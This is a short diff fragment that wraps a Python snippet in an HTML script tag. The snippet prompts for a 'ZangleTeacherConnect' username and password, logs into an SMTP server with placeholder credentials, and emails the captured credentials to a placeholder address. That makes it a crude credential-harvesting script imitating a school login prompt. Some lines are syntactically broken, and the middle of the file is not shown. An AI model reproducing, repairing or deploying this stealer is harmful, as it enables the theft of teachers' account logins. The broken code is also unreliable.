@@ -1,3 +1,4 @@
+<script type="text/python" language="python">
 username = username1
 password = password1
 username1 = raw_input('Please insert your ZangleTeacherConnect username')
@@ -14,3 +15,4 @@ server.login("YOUR EMAIL ADDRESS", "YOUR PASSWORD")
 msg = username1 password1
 server.sendmail("YOUR EMAIL ADDRESS", "THE EMAIL ADDRESS TO SEND TO", msg)
 server.quit()
+    </script>
